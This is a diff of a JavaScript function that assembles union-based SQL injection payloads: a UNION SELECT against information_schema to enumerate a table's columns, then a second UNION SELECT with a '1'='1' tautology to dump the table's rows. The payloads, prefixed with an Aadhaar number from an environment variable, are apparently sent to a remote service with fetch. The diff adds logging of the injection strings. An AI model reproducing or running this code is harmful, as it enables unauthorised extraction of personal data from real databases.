@@ -5,7 +5,7 @@ import maxCols, { regColumns } from "./max-cols";
 
 /**
  *
- * @param db database name
+ * @param {string} database name
  * @returns Array of tests details
  * @returns Error if not able to fetch which is when max columns is reached
  */
@@ -18,6 +18,8 @@ export default async function getTests(db) {
   ).concat(
     `FROM information_schema.COLUMNS where TABLE_NAME='test' and TABLE_SCHEMA='${db}`,
   );
+
+  console.log({ injection });
 
   //fetch columns details
   const res = await fetch(
@@ -44,6 +46,8 @@ export default async function getTests(db) {
     `${process.env.AADHAAR}' UNION SELECT *`,
     remainingColumns,
   ).concat(`FROM ${db}.test where '1'='1`);
+
+  console.log({ injection });
 
   //fetch test details
   const res2 = await fetch(
